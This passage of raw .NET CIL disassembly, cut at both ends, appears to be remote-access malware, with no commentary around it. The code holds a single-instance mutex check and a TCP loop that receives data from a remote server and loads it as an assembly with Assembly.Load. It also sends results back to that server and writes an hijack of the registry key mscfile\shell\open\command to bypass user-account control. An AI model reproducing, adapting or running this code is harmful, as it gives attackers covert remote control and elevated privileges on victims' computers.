    IL_0014:  ldsfld     string[] F.P::HH
    IL_0019:  ldsfld     int32 F.P::NH
    IL_001e:  ldelem.ref
    IL_001f:  ret
  } // end of method P::MH

  .method public static void  Active() cil managed
  {
    // Code size       45 (0x2d)
    .maxstack  8
    IL_0000:  ldsfld     string F.P::HH2
    IL_0005:  ldstr      ","
    IL_000a:  ldc.i4.m1
    IL_000b:  ldc.i4.0
    IL_000c:  call       string[] [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::Split(string,
                                                                                              string,
                                                                                              int32,
                                                                                              valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.CompareMethod)
    IL_0011:  stsfld     string[] F.P::HH
    IL_0016:  ldsfld     string F.P::PN2
    IL_001b:  ldstr      ","
    IL_0020:  ldc.i4.m1
    IL_0021:  ldc.i4.0
    IL_0022:  call       string[] [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::Split(string,
                                                                                              string,
                                                                                              int32,
                                                                                              valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.CompareMethod)
    IL_0027:  stsfld     string[] F.P::PN
    IL_002c:  ret
  } // end of method P::Active

  .method public static void  K() cil managed noinlining nooptimization
  {
    // Code size       244 (0xf4)
    .maxstack  3
    .locals init ([0] int32 num,
             [1] class [mscorlib]System.Threading.Thread s,
             [2] string str,
             [3] class [mscorlib]System.Exception V_3,
             [4] class [mscorlib]System.Exception V_4,
             [5] string str2,
             [6] class [mscorlib]System.Exception ex3,
             [7] native int VB$t_struct$N0)
    .try
    {
      IL_0000:  ldsfld     string F.P::RG
      IL_0005:  call       class [mscorlib]System.Threading.Mutex [mscorlib]System.Threading.Mutex::OpenExisting(string)
      IL_000a:  pop
      IL_000b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
      IL_0010:  leave.s    IL_0020

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0012:  dup
      IL_0013:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0018:  stloc.3
      IL_0019:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_001e:  leave.s    IL_0020

    }  // end handler
    IL_0020:  ldc.i4.1
    IL_0021:  ldsfld     string F.P::RG
    IL_0026:  newobj     instance void [mscorlib]System.Threading.Mutex::.ctor(bool,
                                                                               string)
    IL_002b:  stsfld     object F.P::MT
    IL_0030:  call       void F.P::INSS()
    IL_0035:  ldnull
    IL_0036:  ldftn      void F.P::K2()
    IL_003c:  newobj     instance void [mscorlib]System.Threading.ThreadStart::.ctor(object,
                                                                                     native int)
    IL_0041:  ldc.i4.1
    IL_0042:  newobj     instance void [mscorlib]System.Threading.Thread::.ctor(class [mscorlib]System.Threading.ThreadStart,
                                                                                int32)
    IL_0047:  stloc.1
    IL_0048:  ldloc.1
    IL_0049:  callvirt   instance void [mscorlib]System.Threading.Thread::Start()
    IL_004e:  ldc.i4.0
    IL_004f:  stloc.0
    IL_0050:  ldstr      ""
    IL_0055:  stloc.2
    IL_0056:  ldc.i4.s   100
    IL_0058:  call       object F.P::Thr(int32)
    IL_005d:  pop
    IL_005e:  ldsfld     bool F.P::Cn
    IL_0063:  brtrue.s   IL_006b

    IL_0065:  ldstr      ""
    IL_006a:  stloc.2
    .try
    {
      IL_006b:  ldloc.0
      IL_006c:  ldc.i4.1
      IL_006d:  add.ovf
      IL_006e:  stloc.0
      IL_006f:  ldloc.0
      IL_0070:  ldc.i4.5
      IL_0071:  bne.un.s   IL_0098

      .try
      {
        IL_0073:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::GetCurrentProcess()
        IL_0078:  ldc.i4     0x400
        IL_007d:  call       native int [mscorlib]System.IntPtr::op_Explicit(int32)
        IL_0082:  callvirt   instance void [System]System.Diagnostics.Process::set_MinWorkingSet(native int)
        IL_0087:  leave.s    IL_0098

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_0089:  dup
        IL_008a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_008f:  stloc.s    V_4
        IL_0091:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0096:  leave.s    IL_0098

      }  // end handler
      IL_0098:  ldloc.0
      IL_0099:  ldc.i4.8
      IL_009a:  blt.s      IL_00d3

      IL_009c:  ldc.i4.0
      IL_009d:  stloc.0
      IL_009e:  call       string F.P::ACT()
      IL_00a3:  stloc.s    str2
      IL_00a5:  ldloc.2
      IL_00a6:  ldloc.s    str2
      IL_00a8:  ldc.i4.0
      IL_00a9:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_00ae:  ldc.i4.0
      IL_00af:  beq.s      IL_00d3

      IL_00b1:  ldloc.s    str2
      IL_00b3:  stloc.2
      IL_00b4:  ldc.i4.s   100
      IL_00b6:  call       object F.P::Thr(int32)
      IL_00bb:  pop
      IL_00bc:  ldstr      "act"
      IL_00c1:  ldsfld     string F.P::Y
      IL_00c6:  ldloc.s    str2
      IL_00c8:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_00cd:  call       bool F.P::Send(string)
      IL_00d2:  pop
      IL_00d3:  leave.s    IL_00ef

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_00d5:  dup
      IL_00d6:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00db:  stloc.s    ex3
      IL_00dd:  ldc.i4     0x3e8
      IL_00e2:  call       object F.P::Thr(int32)
      IL_00e7:  pop
      IL_00e8:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00ed:  leave.s    IL_00ef

    }  // end handler
    IL_00ef:  br         IL_0056
  } // end of method P::K

  .method public static void  K2() cil managed
  {
    // Code size       26 (0x1a)
    .maxstack  2
    .locals init ([0] class [mscorlib]System.Threading.Thread Z)
    IL_0000:  ldnull
    IL_0001:  ldftn      void F.P::K3()
    IL_0007:  newobj     instance void [mscorlib]System.Threading.ThreadStart::.ctor(object,
                                                                                     native int)
    IL_000c:  ldc.i4.1
    IL_000d:  newobj     instance void [mscorlib]System.Threading.Thread::.ctor(class [mscorlib]System.Threading.ThreadStart,
                                                                                int32)
    IL_0012:  stloc.0
    IL_0013:  ldloc.0
    IL_0014:  callvirt   instance void [mscorlib]System.Threading.Thread::Start()
    IL_0019:  ret
  } // end of method P::K2

  .method public static void  K3() cil managed
  {
    // Code size       26 (0x1a)
    .maxstack  2
    .locals init ([0] class [mscorlib]System.Threading.Thread Z)
    IL_0000:  ldnull
    IL_0001:  ldftn      void F.P::RC()
    IL_0007:  newobj     instance void [mscorlib]System.Threading.ThreadStart::.ctor(object,
                                                                                     native int)
    IL_000c:  ldc.i4.1
    IL_000d:  newobj     instance void [mscorlib]System.Threading.Thread::.ctor(class [mscorlib]System.Threading.ThreadStart,
                                                                                int32)
    IL_0012:  stloc.0
    IL_0013:  ldloc.0
    IL_0014:  callvirt   instance void [mscorlib]System.Threading.Thread::Start()
    IL_0019:  ret
  } // end of method P::K3

  .method public static string  M(uint8[] B) cil managed
  {
    // Code size       63 (0x3f)
    .maxstack  3
    .locals init ([0] string M,
             [1] uint8 num,
             [2] string str2,
             [3] int32 VB$t_i4$L0,
             [4] uint8[] VB$t_array$L0)
    IL_0000:  newobj     instance void [mscorlib]System.Security.Cryptography.MD5CryptoServiceProvider::.ctor()
    IL_0005:  ldarg.0
    IL_0006:  callvirt   instance uint8[] [mscorlib]System.Security.Cryptography.HashAlgorithm::ComputeHash(uint8[])
    IL_000b:  starg.s    B
    IL_000d:  ldstr      ""
    IL_0012:  stloc.2
    IL_0013:  ldarg.0
    IL_0014:  stloc.s    VB$t_array$L0
    IL_0016:  ldc.i4.0
    IL_0017:  stloc.3
    IL_0018:  br.s       IL_0036

    IL_001a:  ldloc.s    VB$t_array$L0
    IL_001c:  ldloc.3
    IL_001d:  ldelem.u1
    IL_001e:  stloc.1
    IL_001f:  ldloc.2
    IL_0020:  ldloca.s   num
    IL_0022:  ldstr      "x2"
    IL_0027:  call       instance string [mscorlib]System.Byte::ToString(string)
    IL_002c:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_0031:  stloc.2
    IL_0032:  ldloc.3
    IL_0033:  ldc.i4.1
    IL_0034:  add.ovf
    IL_0035:  stloc.3
    IL_0036:  ldloc.3
    IL_0037:  ldloc.s    VB$t_array$L0
    IL_0039:  ldlen
    IL_003a:  conv.ovf.i4
    IL_003b:  blt.s      IL_001a

    IL_003d:  ldloc.2
    IL_003e:  ret
  } // end of method P::M

  .method private static pinvokeimpl("ntdll" winapi) 
          int32  NF(native int hProcess,
                    int32 processInformationClass,
                    int32& processInformation,
                    int32 processInformationLength) cil managed preservesig
  {
  }
  .method public static object  P00(uint8[] b,
                                    string c) cil managed
  {
    // Code size       110 (0x6e)
    .maxstack  3
    .locals init ([0] class [mscorlib]System.Reflection.Module Mo,
             [1] object P00,
             [2] class [mscorlib]System.Type 'type',
             [3] int32 VB$t_i4$L0,
             [4] class [mscorlib]System.Reflection.Module[] VB$t_array$L0,
             [5] int32 VB$t_i4$L1,
             [6] class [mscorlib]System.Type[] VB$t_array$L1)
    IL_0000:  ldarg.0
    IL_0001:  call       class [mscorlib]System.Reflection.Assembly [mscorlib]System.Reflection.Assembly::Load(uint8[])
    IL_0006:  callvirt   instance class [mscorlib]System.Reflection.Module[] [mscorlib]System.Reflection.Assembly::GetModules()
    IL_000b:  stloc.s    VB$t_array$L0
    IL_000d:  ldc.i4.0
    IL_000e:  stloc.3
    IL_000f:  br.s       IL_0065

    IL_0011:  ldloc.s    VB$t_array$L0
    IL_0013:  ldloc.3
    IL_0014:  ldelem.ref
    IL_0015:  stloc.0
    IL_0016:  ldloc.0
    IL_0017:  callvirt   instance class [mscorlib]System.Type[] [mscorlib]System.Reflection.Module::GetTypes()
    IL_001c:  stloc.s    VB$t_array$L1
    IL_001e:  ldc.i4.0
    IL_001f:  stloc.s    VB$t_i4$L1
    IL_0021:  br.s       IL_0059

    IL_0023:  ldloc.s    VB$t_array$L1
    IL_0025:  ldloc.s    VB$t_i4$L1
    IL_0027:  ldelem.ref
    IL_0028:  stloc.2
    IL_0029:  ldloc.2
    IL_002a:  callvirt   instance string [mscorlib]System.Type::get_FullName()
    IL_002f:  ldstr      "."
    IL_0034:  ldarg.1
    IL_0035:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_003a:  callvirt   instance bool [mscorlib]System.String::EndsWith(string)
    IL_003f:  brfalse.s  IL_0053

    IL_0041:  ldloc.0
    IL_0042:  callvirt   instance class [mscorlib]System.Reflection.Assembly [mscorlib]System.Reflection.Module::get_Assembly()
    IL_0047:  ldloc.2
    IL_0048:  callvirt   instance string [mscorlib]System.Type::get_FullName()
    IL_004d:  callvirt   instance object [mscorlib]System.Reflection.Assembly::CreateInstance(string)
    IL_0052:  ret

    IL_0053:  ldloc.s    VB$t_i4$L1
    IL_0055:  ldc.i4.1
    IL_0056:  add.ovf
    IL_0057:  stloc.s    VB$t_i4$L1
    IL_0059:  ldloc.s    VB$t_i4$L1
    IL_005b:  ldloc.s    VB$t_array$L1
    IL_005d:  ldlen
    IL_005e:  conv.ovf.i4
    IL_005f:  blt.s      IL_0023

    IL_0061:  ldloc.3
    IL_0062:  ldc.i4.1
    IL_0063:  add.ovf
    IL_0064:  stloc.3
    IL_0065:  ldloc.3
    IL_0066:  ldloc.s    VB$t_array$L0
    IL_0068:  ldlen
    IL_0069:  conv.ovf.i4
    IL_006a:  blt.s      IL_0011

    IL_006c:  ldnull
    IL_006d:  ret
  } // end of method P::P00

  .method public static void  RC() cil managed
  {
    // Code size       629 (0x275)
    .maxstack  8
    .locals init ([0] int64 num,
             [1] int32 num2,
             [2] int32 count,
             [3] int64 num5,
             [4] string str,
             [5] int32 charCode,
             [6] class [mscorlib]System.Threading.Thread thread,
             [7] class [mscorlib]System.Exception ex,
             [8] class [mscorlib]System.Exception V_8,
             [9] int32 VB$t_i4$L0,
             [10] char VB$t_char$S0)
    IL_0000:  ldc.i4     0xbb8
    IL_0005:  call       object F.P::Thr(int32)
    IL_000a:  pop
    IL_000b:  ldc.i4.1
    IL_000c:  stsfld     bool F.P::Cn
    IL_0011:  ldstr      ""
    IL_0016:  stsfld     string F.P::LC
    IL_001b:  ldsfld     class [System]System.Net.Sockets.TcpClient F.P::C
    IL_0020:  brfalse    IL_01f1

    IL_0025:  ldc.i4.m1
    IL_0026:  conv.i8
    IL_0027:  stloc.0
    IL_0028:  ldc.i4.0
    IL_0029:  stloc.1
    .try
    {
      IL_002a:  ldloc.1
      IL_002b:  ldc.i4.1
      IL_002c:  add.ovf
      IL_002d:  stloc.1
      IL_002e:  ldloc.1
      IL_002f:  ldc.i4.s   10
      IL_0031:  bne.un.s   IL_0035

      IL_0033:  ldc.i4.0
      IL_0034:  stloc.1
      IL_0035:  ldsfld     bool F.P::Cn
      IL_003a:  brtrue.s   IL_0041

      IL_003c:  leave      IL_01f1

      IL_0041:  ldsfld     class [System]System.Net.Sockets.TcpClient F.P::C
      IL_0046:  callvirt   instance int32 [System]System.Net.Sockets.TcpClient::get_Available()
      IL_004b:  ldc.i4.1
      IL_004c:  bge.s      IL_0060

      IL_004e:  ldsfld     class [System]System.Net.Sockets.TcpClient F.P::C
      IL_0053:  callvirt   instance class [System]System.Net.Sockets.Socket [System]System.Net.Sockets.TcpClient::get_Client()
      IL_0058:  ldc.i4.m1
      IL_0059:  ldc.i4.0
      IL_005a:  callvirt   instance bool [System]System.Net.Sockets.Socket::Poll(int32,
                                                                                 valuetype [System]System.Net.Sockets.SelectMode)
      IL_005f:  pop
      IL_0060:  ldsfld     class [System]System.Net.Sockets.TcpClient F.P::C
      IL_0065:  callvirt   instance int32 [System]System.Net.Sockets.TcpClient::get_Available()
      IL_006a:  ldc.i4.0
      IL_006b:  ble        IL_01e0

      IL_0070:  ldloc.0
      IL_0071:  ldc.i4.m1
      IL_0072:  conv.i8
      IL_0073:  bne.un     IL_010b

      IL_0078:  ldstr      ""
      IL_007d:  stloc.s    str
      IL_007f:  ldc.i4.1
      IL_0080:  call       object F.P::Thr(int32)
      IL_0085:  pop
      IL_0086:  ldsfld     class [System]System.Net.Sockets.TcpClient F.P::C
      IL_008b:  callvirt   instance class [System]System.Net.Sockets.NetworkStream [System]System.Net.Sockets.TcpClient::GetStream()
      IL_0090:  callvirt   instance int32 [mscorlib]System.IO.Stream::ReadByte()
      IL_0095:  stloc.s    charCode
      IL_0097:  ldloc.s    charCode
      IL_0099:  ldc.i4.m1
      IL_009a:  sub
      IL_009b:  switch     ( 
                            IL_00aa,
                            IL_00af)
      IL_00a8:  br.s       IL_00e3

      IL_00aa:  leave      IL_01f1

      IL_00af:  ldloc.s    str
      IL_00b1:  call       int64 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToLong(string)
      IL_00b6:  stloc.0
      IL_00b7:  ldstr      ""
      IL_00bc:  stloc.s    str
      IL_00be:  ldloc.0
      IL_00bf:  ldc.i4.0
      IL_00c0:  conv.i8
      IL_00c1:  bne.un.s   IL_00d1

      IL_00c3:  ldstr      ""
      IL_00c8:  call       bool F.P::Send(string)
      IL_00cd:  pop
      IL_00ce:  ldc.i4.m1
      IL_00cf:  conv.i8
      IL_00d0:  stloc.0
      IL_00d1:  ldsfld     class [System]System.Net.Sockets.TcpClient F.P::C
      IL_00d6:  callvirt   instance int32 [System]System.Net.Sockets.TcpClient::get_Available()
      IL_00db:  ldc.i4.0
      IL_00dc:  bgt.s      IL_0060

      IL_00de:  br         IL_002a

      IL_00e3:  ldloc.s    str
      IL_00e5:  ldloc.s    charCode
      IL_00e7:  call       char [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::ChrW(int32)
      IL_00ec:  stloc.s    VB$t_char$S0
      IL_00ee:  ldloca.s   VB$t_char$S0
      IL_00f0:  call       instance string [mscorlib]System.Char::ToString()
      IL_00f5:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
      IL_00fa:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(int32)
      IL_00ff:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0104:  stloc.s    str
      IL_0106:  br         IL_007f

      IL_010b:  ldsfld     class [System]System.Net.Sockets.TcpClient F.P::C
      IL_0110:  callvirt   instance int32 [System]System.Net.Sockets.TcpClient::get_Available()
      IL_0115:  ldc.i4.1
      IL_0116:  add.ovf
      IL_0117:  ldc.i4.1
      IL_0118:  sub.ovf
      IL_0119:  ldc.i4.1
      IL_011a:  add.ovf
      IL_011b:  newarr     [mscorlib]System.Byte
      IL_0120:  stsfld     uint8[] F.P::B
      IL_0125:  ldloc.0
      IL_0126:  ldsfld     class [mscorlib]System.IO.MemoryStream F.P::MeM
      IL_012b:  callvirt   instance int64 [mscorlib]System.IO.MemoryStream::get_Length()
      IL_0130:  sub.ovf
      IL_0131:  stloc.3
      IL_0132:  ldsfld     uint8[] F.P::B
      IL_0137:  ldlen
      IL_0138:  conv.ovf.i4
      IL_0139:  conv.i8
      IL_013a:  ldloc.3
      IL_013b:  ble.s      IL_0152

      IL_013d:  ldloc.3
      IL_013e:  ldc.i4.1
      IL_013f:  conv.i8
      IL_0140:  sub.ovf
      IL_0141:  conv.ovf.i4
      IL_0142:  ldc.i4.1
      IL_0143:  add.ovf
      IL_0144:  ldc.i4.1
      IL_0145:  sub.ovf
      IL_0146:  ldc.i4.1
      IL_0147:  add.ovf
      IL_0148:  newarr     [mscorlib]System.Byte
      IL_014d:  stsfld     uint8[] F.P::B
      IL_0152:  ldsfld     class [System]System.Net.Sockets.TcpClient F.P::C
      IL_0157:  callvirt   instance class [System]System.Net.Sockets.Socket [System]System.Net.Sockets.TcpClient::get_Client()
      IL_015c:  ldsfld     uint8[] F.P::B
      IL_0161:  ldc.i4.0
      IL_0162:  ldsfld     uint8[] F.P::B
      IL_0167:  ldlen
      IL_0168:  conv.ovf.i4
      IL_0169:  ldc.i4.0
      IL_016a:  callvirt   instance int32 [System]System.Net.Sockets.Socket::Receive(uint8[],
                                                                                     int32,
                                                                                     int32,
                                                                                     valuetype [System]System.Net.Sockets.SocketFlags)
      IL_016f:  stloc.2
      IL_0170:  ldsfld     class [mscorlib]System.IO.MemoryStream F.P::MeM
      IL_0175:  ldsfld     uint8[] F.P::B
      IL_017a:  ldc.i4.0
      IL_017b:  ldloc.2
      IL_017c:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                 int32,
                                                                                 int32)
      IL_0181:  ldsfld     class [mscorlib]System.IO.MemoryStream F.P::MeM
      IL_0186:  callvirt   instance int64 [mscorlib]System.IO.MemoryStream::get_Length()
      IL_018b:  ldloc.0
      IL_018c:  bne.un.s   IL_01d4

      IL_018e:  ldc.i4.m1
      IL_018f:  conv.i8
      IL_0190:  stloc.0
      IL_0191:  ldnull
      IL_0192:  ldftn      void F.P::S(object)
      IL_0198:  newobj     instance void [mscorlib]System.Threading.ParameterizedThreadStart::.ctor(object,
                                                                                                    native int)
      IL_019d:  ldc.i4.1
      IL_019e:  newobj     instance void [mscorlib]System.Threading.Thread::.ctor(class [mscorlib]System.Threading.ParameterizedThreadStart,
                                                                                  int32)
      IL_01a3:  stloc.s    thread
      IL_01a5:  ldloc.s    thread
      IL_01a7:  ldsfld     class [mscorlib]System.IO.MemoryStream F.P::MeM
      IL_01ac:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
      IL_01b1:  callvirt   instance void [mscorlib]System.Threading.Thread::Start(object)
      IL_01b6:  ldloc.s    thread
      IL_01b8:  ldc.i4.s   100
      IL_01ba:  callvirt   instance bool [mscorlib]System.Threading.Thread::Join(int32)
      IL_01bf:  pop
      IL_01c0:  ldsfld     class [mscorlib]System.IO.MemoryStream F.P::MeM
      IL_01c5:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
      IL_01ca:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
      IL_01cf:  stsfld     class [mscorlib]System.IO.MemoryStream F.P::MeM
      IL_01d4:  ldc.i4.1
      IL_01d5:  call       object F.P::Thr(int32)
      IL_01da:  pop
      IL_01db:  br         IL_002a

      IL_01e0:  leave.s    IL_01f1

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_01e2:  dup
      IL_01e3:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_01e8:  stloc.s    ex
      IL_01ea:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_01ef:  leave.s    IL_01f1

    }  // end handler
    IL_01f1:  nop
    IL_01f2:  ldc.i4     0x3e8
    IL_01f7:  call       object F.P::Thr(int32)
    IL_01fc:  pop
    .try
    {
      IL_01fd:  ldsfld     object F.P::PLG
      IL_0202:  brfalse.s  IL_0248

      IL_0204:  ldsfld     object F.P::PLG
      IL_0209:  ldnull
      IL_020a:  ldstr      "clear"
      IL_020f:  ldc.i4.0
      IL_0210:  newarr     [mscorlib]System.Object
      IL_0215:  ldnull
      IL_0216:  ldnull
      IL_0217:  ldnull
      IL_0218:  ldc.i4.1
      IL_0219:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateCall(object,
                                                                                                                         class [mscorlib]System.Type,
                                                                                                                         string,
                                                                                                                         object[],
                                                                                                                         string[],
                                                                                                                         class [mscorlib]System.Type[],
                                                                                                                         bool[],
                                                                                                                         bool)
      IL_021e:  pop
      IL_021f:  ldnull
      IL_0220:  stsfld     object F.P::PLG
      IL_0225:  ldsfld     class [mscorlib]System.IO.MemoryStream F.P::MeM
      IL_022a:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
      IL_022f:  call       uint8[] F.P::Z(uint8[])
      IL_0234:  ldstr      "A"
      IL_0239:  call       object F.P::P00(uint8[],
                                           string)
      IL_023e:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0243:  stsfld     object F.P::PLG
      IL_0248:  leave.s    IL_0259

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_024a:  dup
      IL_024b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0250:  stloc.s    V_8
      IL_0252:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0257:  leave.s    IL_0259

    }  // end handler
    IL_0259:  ldc.i4.0
    IL_025a:  stsfld     bool F.P::Cn
    IL_025f:  call       bool F.P::Con()
    IL_0264:  brtrue.s   IL_0268

    IL_0266:  br.s       IL_01f1

    IL_0268:  ldc.i4.s   100
    IL_026a:  call       object F.P::Thr(int32)
    IL_026f:  pop
    IL_0270:  br         IL_0000
  } // end of method P::RC

  .method public static object  Thr(int32 t) cil managed
  {
    // Code size       8 (0x8)
    .maxstack  1
    .locals init ([0] object Thr)
    IL_0000:  ldarg.0
    IL_0001:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
    IL_0006:  ldloc.0
    IL_0007:  ret
  } // end of method P::Thr

  .method public static uint8[]  SB(string& S) cil managed
  {
    // Code size       13 (0xd)
    .maxstack  2
    .locals init ([0] uint8[] SB)
    IL_0000:  call       class [mscorlib]System.Text.Encoding [mscorlib]System.Text.Encoding::get_UTF8()
    IL_0005:  ldarg.0
    IL_0006:  ldind.ref
    IL_0007:  callvirt   instance uint8[] [mscorlib]System.Text.Encoding::GetBytes(string)
    IL_000c:  ret
  } // end of method P::SB

  .method public static object  St(object P) cil managed
  {
    // Code size       73 (0x49)
    .maxstack  9
    .locals init ([0] object St,
             [1] object[] VB$t_array$S0,
             [2] object[] VB$t_array$S1,
             [3] bool[] VB$t_array$S2)
    IL_0000:  ldnull
    IL_0001:  ldtoken    [System]System.Diagnostics.Process
    IL_0006:  call       class [mscorlib]System.Type [mscorlib]System.Type::GetTypeFromHandle(valuetype [mscorlib]System.RuntimeTypeHandle)
    IL_000b:  ldstr      "Start"
    IL_0010:  ldc.i4.1
    IL_0011:  newarr     [mscorlib]System.Object
    IL_0016:  stloc.1
    IL_0017:  ldloc.1
    IL_0018:  ldc.i4.0
    IL_0019:  ldarg.0
    IL_001a:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
    IL_001f:  stelem.ref
    IL_0020:  ldloc.1
    IL_0021:  stloc.2
    IL_0022:  ldloc.2
    IL_0023:  ldnull
    IL_0024:  ldnull
    IL_0025:  ldc.i4.1
    IL_0026:  newarr     [mscorlib]System.Boolean
    IL_002b:  stloc.3
    IL_002c:  ldloc.3
    IL_002d:  ldc.i4.0
    IL_002e:  ldc.i4.1
    IL_002f:  stelem.i1
    IL_0030:  ldloc.3
    IL_0031:  ldc.i4.1
    IL_0032:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateCall(object,
                                                                                                                       class [mscorlib]System.Type,
                                                                                                                       string,
                                                                                                                       object[],
                                                                                                                       string[],
                                                                                                                       class [mscorlib]System.Type[],
                                                                                                                       bool[],
                                                                                                                       bool)
    IL_0037:  pop
    IL_0038:  ldloc.3
    IL_0039:  ldc.i4.0
    IL_003a:  ldelem.i1
    IL_003b:  brfalse.s  IL_0047

    IL_003d:  ldloc.2
    IL_003e:  ldc.i4.0
    IL_003f:  ldelem.ref
    IL_0040:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
    IL_0045:  starg.s    P
    IL_0047:  ldloc.0
    IL_0048:  ret
  } // end of method P::St

  .method public static object  S(string T) cil managed
  {
    // Code size       28 (0x1c)
    .maxstack  3
    .locals init ([0] object S)
    IL_0000:  ldsfld     class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.Registry::CurrentUser
    IL_0005:  ldstr      "Software\\Classes\\mscfile\\shell\\open\\command"
    IL_000a:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::CreateSubKey(string)
    IL_000f:  ldstr      ""
    IL_0014:  ldarg.0
    IL_0015:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::SetValue(string,
                                                                                       object)
    IL_001a:  ldloc.0
    IL_001b:  ret
  } // end of method P::S

  .method public static bool  Send(string S) cil managed
  {
    // Code size       13 (0xd)
    .maxstack  1
    .locals init ([0] bool Send)
    IL_0000:  ldarga.s   S
    IL_0002:  call       uint8[] F.P::SB(string&)
    IL_0007:  call       bool F.P::Sendb(uint8[])
    IL_000c:  ret
  } // end of method P::Send

  .method public static bool  Sendb(uint8[] b) cil managed
  {
    // Code size       209 (0xd1)
    .maxstack  5
    .locals init ([0] bool Sendb,
             [1] class [mscorlib]System.IO.FileInfo lO,
             [2] uint8[] buffer,
             [3] int32 length,
             [4] class [mscorlib]System.IO.MemoryStream 'stream',
             [5] class [mscorlib]System.Exception ex,
             [6] class [mscorlib]System.Exception V_6,
             [7] class [mscorlib]System.IO.FileInfo VB$t_ref$L0,
             [8] string VB$t_string$S0)
    IL_0000:  ldsfld     bool F.P::Cn
    IL_0005:  brtrue.s   IL_0009

    IL_0007:  ldc.i4.0
    IL_0008:  ret

    .try
    {
      IL_0009:  ldsfld     class [mscorlib]System.IO.FileInfo F.P::LO
      IL_000e:  stloc.1
      IL_000f:  ldloc.1
      IL_0010:  stloc.s    VB$t_ref$L0
      IL_0012:  ldloc.s    VB$t_ref$L0
      IL_0014:  call       void [mscorlib]System.Threading.Monitor::Enter(object)
      .try
      {
        IL_0019:  ldsfld     bool F.P::Cn
        IL_001e:  brtrue.s   IL_0027

        IL_0020:  ldc.i4.0
        IL_0021:  stloc.0
        IL_0022:  leave      IL_00cf

        IL_0027:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
        IL_002c:  stloc.s    'stream'
        IL_002e:  ldarg.0
        IL_002f:  ldlen
        IL_0030:  conv.ovf.i4
        IL_0031:  stloc.3
        IL_0032:  ldloca.s   length
        IL_0034:  call       instance string [mscorlib]System.Int32::ToString()
        IL_0039:  ldstr      bytearray (00 00 ) 
        IL_003e:  call       string [mscorlib]System.String::Concat(string,
                                                                    string)
        IL_0043:  stloc.s    VB$t_string$S0
        IL_0045:  ldloca.s   VB$t_string$S0
        IL_0047:  call       uint8[] F.P::SB(string&)
        IL_004c:  stloc.2
        IL_004d:  ldloc.s    'stream'
        IL_004f:  ldloc.2
        IL_0050:  ldc.i4.0
        IL_0051:  ldloc.2
        IL_0052:  ldlen
        IL_0053:  conv.ovf.i4
        IL_0054:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                   int32,
                                                                                   int32)
        IL_0059:  ldloc.s    'stream'
        IL_005b:  ldarg.0
        IL_005c:  ldc.i4.0
        IL_005d:  ldarg.0
        IL_005e:  ldlen
        IL_005f:  conv.ovf.i4
        IL_0060:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                   int32,
                                                                                   int32)
        IL_0065:  ldsfld     class [System]System.Net.Sockets.TcpClient F.P::C
